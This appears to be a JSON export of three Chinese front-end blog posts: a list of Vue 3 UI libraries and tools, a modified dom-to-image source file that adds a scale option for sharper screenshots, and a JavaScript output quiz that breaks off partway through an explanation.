[{"title":"# Vue3  UI库/相关工具/可视化/生态全分享","path":"/post/6677.html","text":"Vue3UI库&#x2F;相关工具&#x2F;可视化&#x2F;生态全分享技术胖整理分享 1.Web UI库1. ElementUI Plus一套为开发者、设计师和产品经理准备的基于 Vue 3.0 的桌面端组件库https://element-plus.org/zh-CN/ 2. Ant Design of VueAnt Design 的 Vue 实现，开发和服务于企业级后台产品https://www.antdv.com/docs/vue/introduce-cn 3. BalmUI基于谷歌的 Material Design，附带 Vue 插件和指令，以及从简单到复杂的高度可定制组件https://next-material.balmjs.com/ 4. Naive UI图森Vue3的组件库，文档完整，我项目中经常使用https://www.naiveui.com/zh-CN/os-theme 5. arco.design字节跳动企业级产品设计系统，支持React和Vue双版本https://arco.design/ 6, Quasar轻松构建高性能和高质量的Vue.js 3用户界面，好用，但没有中文文档https://quasar.dev/ 7. iDUXVue3.x 的 UI 组件库，完全使用 TypeScript 开发https://idux.site/ 8. TDesign腾讯业务团队在服务业务过程中沉淀的一套企业级设计体系https://tdesign.tencent.com/https://tdesign.tencent.com/vue-next/overview 9. PrimeVue易于使用、多功能、高性能的 Vue UI 组件库https://www.primefaces.org/primevue/ 10. DevUI华为基于 Vue3 和 DevUI 设计的 UI 组件https://vue-devui.github.io/ 11. vuestic-uiVue 3 的免费和开源 UI 库 ,UI非常好看，并且有可用后台管理界面。https://vuestic.dev/ 12. Headless UI完全无样式、完全可访问的 UI 组件，旨在与 Tailwind CSS 完美集成。https://headlessui.com/ 13. View UI Plus基于 Vue.js 3 的企业级 UI 组件库和前端解决方案https://www.iviewui.com/ 2.移动UI库14. Vant有赞轻量、可靠的移动端组件库https://vant-contrib.gitee.io/vant/#/zh-CN 15. NutUI京东风格的轻量级移动端 Vue 组件库，非常适合移动端电商使用。https://nutui.jd.com/#/ 16. VarletMaterial 风格移动端组件库 ，文档非常齐全。https://varlet.gitee.io/varlet-ui/#/zh-CN/home 17. nutui-bingo京东基于 NutUI 的抽奖组件库，助力营销活动和小游戏场景。https://nutui.jd.com/bingo/#/ 3.相关工具18. unplugin-vue-componentsantfu 按需组件自动导入，开箱即用地支持 Vue 2 和 Vue 3，Tree-shakable，只注册你使用的组件，附有流行UI 库的内置解析器。https://www.npmjs.com/package/unplugin-vue-components 19. vuex-persistedstate在页面重新加载之间保持并重载您的 Vuex 状态https://github.com/robinvdvleuten/vuex-persistedstate 20. vuex-persist支持 Typescript 的Vuex插件，它能够将应用程序的状态保存到持久存储中，例如 Cookies 或 localStoragehttps://championswimmer.in/vuex-persist/ 21. @vueuse&#x2F;gesture手势库，使应用程序具有交互性https://gesture.vueuse.org/ 22. unplugin-auto-importantfu 自动导入 Vite、Webpack、Rollup 和 esbuild 的 API。支持 TypeScript。https://github.com/antfu/unplugin-auto-import 23. pinia-plugin-persistedstatePinia 商店的可配置持久性https://github.com/prazdevs/pinia-plugin-persistedstate 24. https://vue-termui.dev/一个基于 Vue.js 的终端 UI 框架，可让您轻松构建现代终端应用程序https://vue-termui.dev/ 4.可视化25. PdfvuerDF 查看器，使用 Mozilla 的 PDF.js，支持 Vue2 和 Vue3https://arkokoley.github.io/pdfvuer/ 26. vue3-marquee无缝滚动组件https://vue3-marquee.vercel.app/ 27. Vue-ECharts百度ECharts 的 Vue.js 组件。 配置参考Echarts官方 基于 ECharts v5+ 开发，适用于Vue.js 2&#x2F;3。https://vue-echarts.dev/ 28. iconpark字节跳动出品，将一个SVG图标转化为多个主题，并生成React图标，Vue图标，svg图标https://iconpark.oceanengine.com/home 5.插件29. vue-multiselect-nextVue.js 的通用选择&#x2F;多选&#x2F;标记组件https://vue-multiselect.js.org/ 30. vue-print-nb用于印刷、简单、快速、方便、轻便的指令包装器https://github.com/Power-kxLee/vue-print-nb 31. vue-i18n-nextVue3的国际化插件https://vue-i18n.intlify.dev/ 32. vue-cropper简单的vue图片裁剪插件http://github.xyxiao.cn/vue-cropper/example/ 33. Vue Grid LayoutVue.js 的网格布局系统https://jbaysolutions.github.io/ 34. Vue Qrcode Reader允许在不离开浏览器的情况下检测和解码二维码https://gruhn.github.io/vue-qrcode-reader/ 35. Makeit Captcha基于 Vue3 + Vite + Canvas 开发的滑块验证码，动态生成验证滑块，结合后端的二次校验，能有效的避免被抓取模拟验证https://admin.makeit.vip/components/captcha 36. vue3-clipboardVue 3 的 clipboard.jshttps://github.com/soerenmartius/vue3-clipboard 37. vue.draggable基于Sortable.js的Vue 3拖放组件https://sortablejs.github.io/vue.draggable.next/#/simple 38. BetterScroll解决移动端（已支持 PC）各种滚动场景需求的插件。https://better-scroll.github.io/docs/zh-CN/ 6.相关生态39. Vue 插件库https://www.vue365.cn/ 40. Pinia轻量级状态管理库，API 设计更接近Vuex 5的提案https://pinia.vuejs.org/ 41. Nuxt ModulesNuxt 发现我们的模块列表以增强您的Nuxt 项目https://modules.nuxtjs.org/ 42. Nuxt 3轻量级应用框架,可用来创建服务端渲染 (SSR) 应用https://v3.nuxtjs.org/ 43. vuepressVue 驱动的静态网站生成器https://v2.vuepress.vuejs.org/zh/ 44. VueUse强大的 Vue 组合实用程序集合https://vueuse.org/ 7.动画45. vue-starport带有动画的跨路由共享组件https://vue-starport.netlify.app/ 46. @vueuse&#x2F;motionVue Composables 让你的组件动起来https://motion.vueuse.org/ 8.音视频47. @vueuse&#x2F;sound用于播放音效的 Vue 组合https://sound.vueuse.org/ XMind: ZEN - Trial Version"},{"title":"dom-to-image失真，修改生成后的清晰度","path":"/post/65fa.html","text":"背景：项目中遇到了网页截图的场景，开始使用了html2canvas ，本地一切都好，但正式环境中出现问题，dom中有图片，以为是这些图片跨域，最后按照解决办法也不行；再后来又看到是dom要设置宽高，但试过依旧不可以。最终换个库来实现需求 dom-to-imagegithub: https://github.com/tsayen/dom-to-image 后来发现了基于此库的新项目 dom-to-image-more（https://www.npmjs.com/package/dom-to-image-more） 改造项目中使用发现清晰度有点低，客户也指出来，但这个库貌似并没有相关配置可以实现，无奈只得开始对其进行修改 文件替换文件路径： node_modules\\dom-to-image\\src\\dom-to-image.js (function (global) &#123; 'use strict'; var util = newUtil(); var inliner = newInliner(); var fontFaces = newFontFaces(); var images = newImages(); // Default impl options var defaultOptions = &#123; // Default is to fail on error, no placeholder imagePlaceholder: undefined, // Default cache bust is false, it will use the cache cacheBust: false &#125;; var domtoimage = &#123; toSvg: toSvg, toPng: toPng, toJpeg: toJpeg, toBlob: toBlob, toPixelData: toPixelData, impl: &#123; fontFaces: fontFaces, images: images, util: util, inliner: inliner, options: &#123;&#125; &#125; &#125;; if (typeof module !== 'undefined') module.exports = domtoimage; else global.domtoimage = domtoimage; /** * @param &#123;Node&#125; node - The DOM Node object to render * @param &#123;Object&#125; options - Rendering options * @param &#123;Function&#125; options.filter - Should return true if passed node should be included in the output * (excluding node means excluding it's children as well). Not called on the root node. * @param &#123;String&#125; options.bgcolor - color for the background, any valid CSS color value. * @param &#123;Number&#125; options.width - width to be applied to node before rendering. * @param &#123;Number&#125; options.height - height to be applied to node before rendering. * @param &#123;Object&#125; options.style - an object whose properties to be copied to node's style before rendering. * @param &#123;Number&#125; options.quality - a Number between 0 and 1 indicating image quality (applicable to JPEG only), defaults to 1.0. * @param &#123;String&#125; options.imagePlaceholder - dataURL to use as a placeholder for failed images, default behaviour is to fail fast on images we can't fetch * @param &#123;Boolean&#125; options.cacheBust - set to true to cache bust by appending the time to the request url * @return &#123;Promise&#125; - A promise that is fulfilled with a SVG image data URL * */ function toSvg (node, options) &#123; options = options || &#123;&#125;; copyOptions(options); return Promise.resolve(node) .then(function (node) &#123; return cloneNode(node, options.filter, true); &#125;) .then(embedFonts) .then(inlineImages) .then(applyOptions) .then(function (clone) &#123; return makeSvgDataUri(clone, options.width || util.width(node), options.height || util.height(node) ); &#125;); function applyOptions (clone) &#123; if (options.bgcolor) clone.style.backgroundColor = options.bgcolor; if (options.width) clone.style.width = options.width + 'px'; if (options.height) clone.style.height = options.height + 'px'; if (options.style) Object.keys(options.style).forEach(function (property) &#123; clone.style[property] = options.style[property]; &#125;); return clone; &#125; &#125; /** * @param &#123;Node&#125; node - The DOM Node object to render * @param &#123;Object&#125; options - Rendering options, @see &#123;@link toSvg&#125; * @return &#123;Promise&#125; - A promise that is fulfilled with a Uint8Array containing RGBA pixel data. * */ function toPixelData (node, options) &#123; return draw(node, options || &#123;&#125;) .then(function (canvas) &#123; return canvas.getContext('2d').getImageData( 0, 0, util.width(node), util.height(node) ).data; &#125;); &#125; /** * @param &#123;Node&#125; node - The DOM Node object to render * @param &#123;Object&#125; options - Rendering options, @see &#123;@link toSvg&#125; * @return &#123;Promise&#125; - A promise that is fulfilled with a PNG image data URL * */ function toPng (node, options) &#123; return draw(node, options || &#123;&#125;) .then(function (canvas) &#123; return canvas.toDataURL(); &#125;); &#125; /** * @param &#123;Node&#125; node - The DOM Node object to render * @param &#123;Object&#125; options - Rendering options, @see &#123;@link toSvg&#125; * @return &#123;Promise&#125; - A promise that is fulfilled with a JPEG image data URL * */ function toJpeg (node, options) &#123; options = options || &#123;&#125;; return draw(node, options) .then(function (canvas) &#123; return canvas.toDataURL('image/jpeg', options.quality || 1.0); &#125;); &#125; /** * @param &#123;Node&#125; node - The DOM Node object to render * @param &#123;Object&#125; options - Rendering options, @see &#123;@link toSvg&#125; * @return &#123;Promise&#125; - A promise that is fulfilled with a PNG image blob * */ function toBlob (node, options) &#123; return draw(node, options || &#123;&#125;) .then(util.canvasToBlob); &#125; function copyOptions (options) &#123; // Copy options to impl options for use in impl if (typeof (options.imagePlaceholder) === 'undefined') &#123; domtoimage.impl.options.imagePlaceholder = defaultOptions.imagePlaceholder; &#125; else &#123; domtoimage.impl.options.imagePlaceholder = options.imagePlaceholder; &#125; if (typeof (options.cacheBust) === 'undefined') &#123; domtoimage.impl.options.cacheBust = defaultOptions.cacheBust; &#125; else &#123; domtoimage.impl.options.cacheBust = options.cacheBust; &#125; &#125; function draw (domNode, options) &#123; return toSvg(domNode, options) .then(util.makeImage) .then(util.delay(100)) .then(function (image) &#123; var canvas = newCanvas(domNode); canvas.getContext('2d').drawImage(image, 0, 0); return canvas; &#125;); function newCanvas (domNode) &#123; var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.mozImageSmoothingEnabled = false; ctx.webkitImageSmoothingEnabled = false; ctx.msImageSmoothingEnabled = false; ctx.imageSmoothingEnabled = false; var scale = options.scale || 1; // 默认值1 canvas.width = (options.width * scale) || util.width(domNode); canvas.height = (options.height * scale) || util.height(domNode); ctx.scale(scale, scale) // 添加了scale参数 if (options.bgcolor) &#123; ctx.fillStyle = options.bgcolor; ctx.fillRect(0, 0, canvas.width, canvas.height); &#125; return canvas; &#125; &#125; function cloneNode (node, filter, root) &#123; if (!root &amp;&amp; filter &amp;&amp; !filter(node)) return Promise.resolve(); return Promise.resolve(node) .then(makeNodeCopy) .then(function (clone) &#123; return cloneChildren(node, clone, filter); &#125;) .then(function (clone) &#123; return processClone(node, clone); &#125;); function makeNodeCopy (node) &#123; if (node instanceof HTMLCanvasElement) return util.makeImage(node.toDataURL()); return node.cloneNode(false); &#125; function cloneChildren (original, clone, filter) &#123; var children = original.childNodes; if (children.length === 0) return Promise.resolve(clone); return cloneChildrenInOrder(clone, util.asArray(children), filter) .then(function () &#123; return clone; &#125;); function cloneChildrenInOrder (parent, children, filter) &#123; var done = Promise.resolve(); children.forEach(function (child) &#123; done = done .then(function () &#123; return cloneNode(child, filter); &#125;) .then(function (childClone) &#123; if (childClone) parent.appendChild(childClone); &#125;); &#125;); return done; &#125; &#125; function processClone (original, clone) &#123; if (!(clone instanceof Element)) return clone; return Promise.resolve() .then(cloneStyle) .then(clonePseudoElements) .then(copyUserInput) .then(fixSvg) .then(function () &#123; return clone; &#125;); function cloneStyle () &#123; copyStyle(window.getComputedStyle(original), clone.style); function copyStyle (source, target) &#123; if (source.cssText) target.cssText = source.cssText; else copyProperties(source, target); function copyProperties (source, target) &#123; util.asArray(source).forEach(function (name) &#123; target.setProperty( name, source.getPropertyValue(name), source.getPropertyPriority(name) ); &#125;); &#125; &#125; &#125; function clonePseudoElements () &#123; [':before', ':after'].forEach(function (element) &#123; clonePseudoElement(element); &#125;); function clonePseudoElement (element) &#123; var style = window.getComputedStyle(original, element); var content = style.getPropertyValue('content'); if (content === '' || content === 'none') return; var className = util.uid(); clone.className = clone.className + ' ' + className; var styleElement = document.createElement('style'); styleElement.appendChild(formatPseudoElementStyle(className, element, style)); clone.appendChild(styleElement); function formatPseudoElementStyle (className, element, style) &#123; var selector = '.' + className + ':' + element; var cssText = style.cssText ? formatCssText(style) : formatCssProperties(style); return document.createTextNode(selector + '&#123;' + cssText + '&#125;'); function formatCssText (style) &#123; var content = style.getPropertyValue('content'); return style.cssText + ' content: ' + content + ';'; &#125; function formatCssProperties (style) &#123; return util.asArray(style) .map(formatProperty) .join('; ') + ';'; function formatProperty (name) &#123; return name + ': ' + style.getPropertyValue(name) + (style.getPropertyPriority(name) ? ' !important' : ''); &#125; &#125; &#125; &#125; &#125; function copyUserInput () &#123; if (original instanceof HTMLTextAreaElement) clone.innerHTML = original.value; if (original instanceof HTMLInputElement) clone.setAttribute(\"value\", original.value); &#125; function fixSvg () &#123; if (!(clone instanceof SVGElement)) return; clone.setAttribute('xmlns', 'http://www.w3.org/2000/svg'); if (!(clone instanceof SVGRectElement)) return; ['width', 'height'].forEach(function (attribute) &#123; var value = clone.getAttribute(attribute); if (!value) return; clone.style.setProperty(attribute, value); &#125;); &#125; &#125; &#125; function embedFonts (node) &#123; return fontFaces.resolveAll() .then(function (cssText) &#123; var styleNode = document.createElement('style'); node.appendChild(styleNode); styleNode.appendChild(document.createTextNode(cssText)); return node; &#125;); &#125; function inlineImages (node) &#123; return images.inlineAll(node) .then(function () &#123; return node; &#125;); &#125; function makeSvgDataUri (node, width, height) &#123; return Promise.resolve(node) .then(function (node) &#123; node.setAttribute('xmlns', 'http://www.w3.org/1999/xhtml'); return new XMLSerializer().serializeToString(node); &#125;) .then(util.escapeXhtml) .then(function (xhtml) &#123; return '&lt;foreignObject x=\"0\" y=\"0\" width=\"100%\" height=\"100%\">' + xhtml + '&lt;/foreignObject>'; &#125;) .then(function (foreignObject) &#123; return '&lt;svg xmlns=\"http://www.w3.org/2000/svg\" width=\"' + width + '\" height=\"' + height + '\">' + foreignObject + '&lt;/svg>'; &#125;) .then(function (svg) &#123; return 'data:image/svg+xml;charset=utf-8,' + svg; &#125;); &#125; function newUtil () &#123; return &#123; escape: escape, parseExtension: parseExtension, mimeType: mimeType, dataAsUrl: dataAsUrl, isDataUrl: isDataUrl, canvasToBlob: canvasToBlob, resolveUrl: resolveUrl, getAndEncode: getAndEncode, uid: uid(), delay: delay, asArray: asArray, escapeXhtml: escapeXhtml, makeImage: makeImage, width: width, height: height &#125;; function mimes () &#123; /* * Only WOFF and EOT mime types for fonts are 'real' * see http://www.iana.org/assignments/media-types/media-types.xhtml */ var WOFF = 'application/font-woff'; var JPEG = 'image/jpeg'; return &#123; 'woff': WOFF, 'woff2': WOFF, 'ttf': 'application/font-truetype', 'eot': 'application/vnd.ms-fontobject', 'png': 'image/png', 'jpg': JPEG, 'jpeg': JPEG, 'gif': 'image/gif', 'tiff': 'image/tiff', 'svg': 'image/svg+xml' &#125;; &#125; function parseExtension (url) &#123; var match = /\\.([^\\.\\/]*?)$/g.exec(url); if (match) return match[1]; else return ''; &#125; function mimeType (url) &#123; var extension = parseExtension(url).toLowerCase(); return mimes()[extension] || ''; &#125; function isDataUrl (url) &#123; return url.search(/^(data:)/) !== -1; &#125; function toBlob (canvas) &#123; return new Promise(function (resolve) &#123; var binaryString = window.atob(canvas.toDataURL().split(',')[1]); var length = binaryString.length; var binaryArray = new Uint8Array(length); for (var i = 0; i &lt; length; i++) binaryArray[i] = binaryString.charCodeAt(i); resolve(new Blob([binaryArray], &#123; type: 'image/png' &#125;)); &#125;); &#125; function canvasToBlob (canvas) &#123; if (canvas.toBlob) return new Promise(function (resolve) &#123; canvas.toBlob(resolve); &#125;); return toBlob(canvas); &#125; function resolveUrl (url, baseUrl) &#123; var doc = document.implementation.createHTMLDocument(); var base = doc.createElement('base'); doc.head.appendChild(base); var a = doc.createElement('a'); doc.body.appendChild(a); base.href = baseUrl; a.href = url; return a.href; &#125; function uid () &#123; var index = 0; return function () &#123; return 'u' + fourRandomChars() + index++; function fourRandomChars () &#123; /* see http://stackoverflow.com/a/6248722/2519373 */ return ('0000' + (Math.random() * Math.pow(36, 4) &lt;&lt; 0).toString(36)).slice(-4); &#125; &#125;; &#125; function makeImage (uri) &#123; return new Promise(function (resolve, reject) &#123; var image = new Image(); image.onload = function () &#123; resolve(image); &#125;; image.onerror = reject; image.src = uri; &#125;); &#125; function getAndEncode (url) &#123; var TIMEOUT = 30000; if (domtoimage.impl.options.cacheBust) &#123; // Cache bypass so we dont have CORS issues with cached images // Source: https://developer.mozilla.org/en/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest#Bypassing_the_cache url += ((/\\?/).test(url) ? \"&amp;\" : \"?\") + (new Date()).getTime(); &#125; return new Promise(function (resolve) &#123; var request = new XMLHttpRequest(); request.onreadystatechange = done; request.ontimeout = timeout; request.responseType = 'blob'; request.timeout = TIMEOUT; request.open('GET', url, true); request.send(); var placeholder; if (domtoimage.impl.options.imagePlaceholder) &#123; var split = domtoimage.impl.options.imagePlaceholder.split(/,/); if (split &amp;&amp; split[1]) &#123; placeholder = split[1]; &#125; &#125; function done () &#123; if (request.readyState !== 4) return; if (request.status !== 200) &#123; if (placeholder) &#123; resolve(placeholder); &#125; else &#123; fail('cannot fetch resource: ' + url + ', status: ' + request.status); &#125; return; &#125; var encoder = new FileReader(); encoder.onloadend = function () &#123; var content = encoder.result.split(/,/)[1]; resolve(content); &#125;; encoder.readAsDataURL(request.response); &#125; function timeout () &#123; if (placeholder) &#123; resolve(placeholder); &#125; else &#123; fail('timeout of ' + TIMEOUT + 'ms occured while fetching resource: ' + url); &#125; &#125; function fail (message) &#123; console.error(message); resolve(''); &#125; &#125;); &#125; function dataAsUrl (content, type) &#123; return 'data:' + type + ';base64,' + content; &#125; function escape (string) &#123; return string.replace(/([.*+?^$&#123;&#125;()|\\[\\]\\/\\\\])/g, '\\\\$1'); &#125; function delay (ms) &#123; return function (arg) &#123; return new Promise(function (resolve) &#123; setTimeout(function () &#123; resolve(arg); &#125;, ms); &#125;); &#125;; &#125; function asArray (arrayLike) &#123; var array = []; var length = arrayLike.length; for (var i = 0; i &lt; length; i++) array.push(arrayLike[i]); return array; &#125; function escapeXhtml (string) &#123; return string.replace(/#/g, '%23').replace(/\\n/g, '%0A'); &#125; function width (node) &#123; var leftBorder = px(node, 'border-left-width'); var rightBorder = px(node, 'border-right-width'); return node.scrollWidth + leftBorder + rightBorder; &#125; function height (node) &#123; var topBorder = px(node, 'border-top-width'); var bottomBorder = px(node, 'border-bottom-width'); return node.scrollHeight + topBorder + bottomBorder; &#125; function px (node, styleProperty) &#123; var value = window.getComputedStyle(node).getPropertyValue(styleProperty); return parseFloat(value.replace('px', '')); &#125; &#125; function newInliner () &#123; var URL_REGEX = /url\\(['\"]?([^'\"]+?)['\"]?\\)/g; return &#123; inlineAll: inlineAll, shouldProcess: shouldProcess, impl: &#123; readUrls: readUrls, inline: inline &#125; &#125;; function shouldProcess (string) &#123; return string.search(URL_REGEX) !== -1; &#125; function readUrls (string) &#123; var result = []; var match; while ((match = URL_REGEX.exec(string)) !== null) &#123; result.push(match[1]); &#125; return result.filter(function (url) &#123; return !util.isDataUrl(url); &#125;); &#125; function inline (string, url, baseUrl, get) &#123; return Promise.resolve(url) .then(function (url) &#123; return baseUrl ? util.resolveUrl(url, baseUrl) : url; &#125;) .then(get || util.getAndEncode) .then(function (data) &#123; return util.dataAsUrl(data, util.mimeType(url)); &#125;) .then(function (dataUrl) &#123; return string.replace(urlAsRegex(url), '$1' + dataUrl + '$3'); &#125;); function urlAsRegex (url) &#123; return new RegExp('(url\\\\([\\'\"]?)(' + util.escape(url) + ')([\\'\"]?\\\\))', 'g'); &#125; &#125; function inlineAll (string, baseUrl, get) &#123; if (nothingToInline()) return Promise.resolve(string); return Promise.resolve(string) .then(readUrls) .then(function (urls) &#123; var done = Promise.resolve(string); urls.forEach(function (url) &#123; done = done.then(function (string) &#123; return inline(string, url, baseUrl, get); &#125;); &#125;); return done; &#125;); function nothingToInline () &#123; return !shouldProcess(string); &#125; &#125; &#125; function newFontFaces () &#123; return &#123; resolveAll: resolveAll, impl: &#123; readAll: readAll &#125; &#125;; function resolveAll () &#123; return readAll(document) .then(function (webFonts) &#123; return Promise.all( webFonts.map(function (webFont) &#123; return webFont.resolve(); &#125;) ); &#125;) .then(function (cssStrings) &#123; return cssStrings.join('\\n'); &#125;); &#125; function readAll () &#123; return Promise.resolve(util.asArray(document.styleSheets)) .then(getCssRules) .then(selectWebFontRules) .then(function (rules) &#123; return rules.map(newWebFont); &#125;); function selectWebFontRules (cssRules) &#123; return cssRules .filter(function (rule) &#123; return rule.type === CSSRule.FONT_FACE_RULE; &#125;) .filter(function (rule) &#123; return inliner.shouldProcess(rule.style.getPropertyValue('src')); &#125;); &#125; function getCssRules (styleSheets) &#123; var cssRules = []; styleSheets.forEach(function (sheet) &#123; try &#123; util.asArray(sheet.cssRules || []).forEach(cssRules.push.bind(cssRules)); &#125; catch (e) &#123; console.log('Error while reading CSS rules from ' + sheet.href, e.toString()); &#125; &#125;); return cssRules; &#125; function newWebFont (webFontRule) &#123; return &#123; resolve: function resolve () &#123; var baseUrl = (webFontRule.parentStyleSheet || &#123;&#125;).href; return inliner.inlineAll(webFontRule.cssText, baseUrl); &#125;, src: function () &#123; return webFontRule.style.getPropertyValue('src'); &#125; &#125;; &#125; &#125; &#125; function newImages () &#123; return &#123; inlineAll: inlineAll, impl: &#123; newImage: newImage &#125; &#125;; function newImage (element) &#123; return &#123; inline: inline &#125;; function inline (get) &#123; if (util.isDataUrl(element.src)) return Promise.resolve(); return Promise.resolve(element.src) .then(get || util.getAndEncode) .then(function (data) &#123; return util.dataAsUrl(data, util.mimeType(element.src)); &#125;) .then(function (dataUrl) &#123; return new Promise(function (resolve, reject) &#123; element.onload = resolve; element.onerror = reject; element.src = dataUrl; &#125;); &#125;); &#125; &#125; function inlineAll (node) &#123; if (!(node instanceof Element)) return Promise.resolve(node); return inlineBackground(node) .then(function () &#123; if (node instanceof HTMLImageElement) return newImage(node).inline(); else return Promise.all( util.asArray(node.childNodes).map(function (child) &#123; return inlineAll(child); &#125;) ); &#125;); function inlineBackground (node) &#123; var background = node.style.getPropertyValue('background'); if (!background) return Promise.resolve(node); return inliner.inlineAll(background) .then(function (inlined) &#123; node.style.setProperty( 'background', inlined, node.style.getPropertyPriority('background') ); &#125;) .then(function () &#123; return node; &#125;); &#125; &#125; &#125; &#125;)(this); 在使用的地方直接添加参数 // 跳转到生成名片 clickGeneratePictureBydomtoimage()&#123; console.log('clickGeneratePictureBydomtoimage') var that = this; var index = that.activeIndex; let node = document.getElementsByClassName(\"mint-swipe-item\")[index] var options = &#123; width:375, // 高度宽度自行设定 height:450, scale:8 &#125; domtoimage.toPng(node, options) .then(function (dataUrl) &#123; //do something &#125;) .catch(function (error) &#123; console.error('oops, something went wrong!', error); &#125;); &#125;"},{"title":"前端知识点杂集","path":"/post/e277.html","text":"第一题尝试推测它的输出： const person = &#123; name: '代码与野兽' &#125; Object.defineProperty(person, 'age', &#123; value: 18 &#125;) console.log(person.age) console.log(Object.keys(person)) 输出： 18 ['name'] 解析：很多人容易搞错第二个输出，因为使用 defineProperty 定义的属性默认是不可枚举的。 第二题尝试推测它的输出： const name = '代码与野兽' age = 18 console.log(delete name) console.log(delete age) console.log(typeof age) 输出： false true \"undefined\" 解析：第一个 false 是因为 delete 只能删除对象上的属性，name 不是属性，所以删除失败。第二个 true 是因为我们不使用任何声明创建变量，它会被视作全局变量，挂载到 window 对象上面，等价于 delete window.age，所以删除成功。第三个 undefined 是因为 age 被删除了。 第三题尝试推测它的输出： let person = &#123; name: '代码与野兽' &#125; const members = [person] person = null console.log(members) 输出： [&#123; name: \"代码与野兽\" &#125;] 解析：很多人会认为输出结果应该是 [ null ]，但是，我们只是设置了 person 这个变量的新引用，之前的引用还在 members 中。简单来说，{ name: ‘代码与野兽’ } 这个对象存在某个内存空间中，假设它的地址是 X201。它的逻辑大概像下面这样： let person = X201 const members = [X201] persion = null 第四题尝试推测它的输出： function SuperHero() &#123; this.make = '代码与野兽' return &#123; make: '野兽与代码'&#125; &#125; const mySuperhero = new SuperHero() console.log(mySuperhero) 输出： &#123; make: \"野兽与代码\" &#125; 解析：如果构造函数最终返回了一个对象，那么之前设置的属性都将失效。 第五题尝试推测它的输出： const name = '代码与野兽' console.log(name.padStart(14)) console.log(name.padStart(2)) 输出： \" 代码与野兽\" \"代码与野兽\" 解析：padStart 方法可以在字符串的开头填充空格。参数是新字符串的总长度，如果这个长度比原来的字符串长度短，那么不会填充。 第六题尝试推测它的输出： console.log(parseInt(\"7\")) console.log(parseInt(\"7*6\")) console.log(parseInt(\"7Din\")) 输出： 7 7 7 解析：如果 parseInt 的参数是字符串和数字的组合，那么它会从头开始检查，直到碰到数据类型错误的位置，如果在数据类型错误的位置之前是一个有效的数字，它就会返回数字。 第七题尝试推测它的输出： [1, 2, 3, 4].reduce((x, y) => console.log(x, y)) 输出： 1 2 undefined 3 undefined 4 解析：如果我们不给 reduce 传递初始值，那么 x 会是数组的第一个值，y 是数组的第二个值。 const arr = [1, 2, 3, 4, 5] const sum = arr.reduce((pre, item) => &#123; console.log(pre, item) return pre + item &#125;) console.log(sum) // 15 第八题尝试推测它的输出： function getUserInfo(one, two, three) &#123; console.log(one) console.log(two) console.log(three) &#125; const superHero = '代码与野兽' const age = 1000 getUserInfo`$&#123;superHero&#125; 是 $&#123;age&#125; 岁` getUserInfo`hello` 输出： > [\"\",\" 是 \",\" 岁\"] > 代码与野兽 > 1000 > [\"hello\"] > undefined > undefined 解析：我们使用模板字符串语法去调用函数时，第一个参数始终都是分割好的字符串数组。其余的参数是模板表达式的值。 第九题尝试推测它的输出： (() => &#123; let x, y; try &#123; throw new Error() &#125; catch (x) &#123; (x = 1), (y = 2); console.log(x) &#125; console.log(x) console.log(y) &#125;)() 输出： 1 undefined 2 解析：在 catch 中访问 x，访问的是参数，而不是外面的变量 x。 第十题尝试推测它的输出： class Clazz &#123;&#125; console.log(typeof Clazz) 输出： \"function\" 解析：在 JavaScript 中，Class 也是 function。 第十一题尝试推测它的输出： const arr = [7, 1, 4, 3, 2]; for (const elem of arr) &#123; setTimeout(() => console.log(elem), elem); &#125; 输出： 1 2 3 4 7 第十二题尝试推测它的输出： const foo = &#123; bar: 1 &#125;; with(foo) &#123; var bar = 2 &#125;; console.log(foo.bar); 输出： 2 解析：with 的对象会作为 global 对象。在 with 使用 var 等价于 window.[xxx]。而这时 foo 就是那个 window。 作者：代码与野兽链接：https://juejin.cn/post/7133397098719870990来源：稀土掘金著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 第十三题// a function Foo () &#123; getName = function () &#123; console.log(1); &#125; return this; &#125; // b Foo.getName = function () &#123; console.log(2); &#125; // c Foo.prototype.getName = function () &#123; console.log(3); &#125; // d var getName = function () &#123; console.log(4); &#125; // e function getName () &#123; console.log(5); &#125; 第十四题按顺序执行后分别输出什么？ Foo.getName(); getName(); Foo().getName(); getName(); new Foo.getName(); new Foo().getName(); new new Foo().getName(); 答案Foo.getName(); // 2 getName(); // 4 Foo().getName(); // 1 getName(); // 1 new Foo.getName(); // 2 new Foo().getName(); // 3 new new Foo().getName(); // 3 解析1. Foo.getName()这一问首先考察的是函数的基本概念：在 JS 中函数是第一类对象，也被称作”一等公民”，这是因为函数拥有对象所拥有的全部功能。所以这里的 Foo.getName() 可以看作是调用了 Foo 对象上的属性，在题目中的 b 处有其定义，故结果输出 2 。 2. getName()这里调用的 getName 在上下文中被定义了两次，一次是通过变量声明，一次是函数声明，故这一问考察的是变量声明提升与函数声明提升，声明提前会让声明提升到代码的最上层，而函数再一次发挥了它”一等公民“的特权：函数声明提升比变量更高，所以这一问实际执行代码可看作： function getName() &#123; console.log(5); &#125;; var getName; getName = function () &#123; console.log(4); &#125;; 复制代码 两者声明共同提升之后，变量的赋值操作最后执行，所以调用 getName() 输出的结果是 4 。 3. Foo().getName()和第一问相比看似只多了个括号，实际考察的内容完全不一样。 我们先复习一下 JS 中的运算符优先级，这是下来全部解题的基础，MDN 汇总表 -&gt; 链接在这里。 首先成员访问运算从左到右执行，所以我们要先看 Foo() 函数做了什么，根据题目 a 处的定义： function Foo () &#123; getName = function () &#123; console.log(1); &#125; return this; &#125; 复制代码 执行 Foo() 之后为 getName 赋值一个函数，注意这里的 getName 并没有 var 关键字，所以还考察了作用域链的知识点，JS 在遇到未声明的变量时会向上一级一层层查找，前面我们知道了变量声明会提升，在全局作用域下 getName 是已经被声明的了，所以执行 Foo() 的作用其实就是把全局的 getName 又赋值了新函数。 而 Foo() 本身返回了 this，所以这一问又变成了「this.getName() 输出什么？」。这里当然也就考察了 this 关键字 的知识点，只要记住：this 谁最后调用它那它就指向谁，这里的 this 没有改变过指向，所以是在全局下执行，也就是执行 getName()，执行结果是前面 Foo() 赋予的新函数，所以输出了 1 。 4. getName()由于题目条件是顺序执行，所以这里经过了第三问之后全局 getName 已经被修改过了，在上一问已经解析完，这里毫无疑问执行输出是 1 。 5. new Foo.getName()乍一看以为是要考察 new 关键字 了，其实并没有，它还是考察了上面提到的运算符优先级，根据优先级我们可以得出，Foo.getName() 是会先执行的，执行完只是输出了第一问的结果，再对其执行 new 没有意义，最后输出的还是 2 。 6. new Foo().getName()这里开始考察 new 关键字 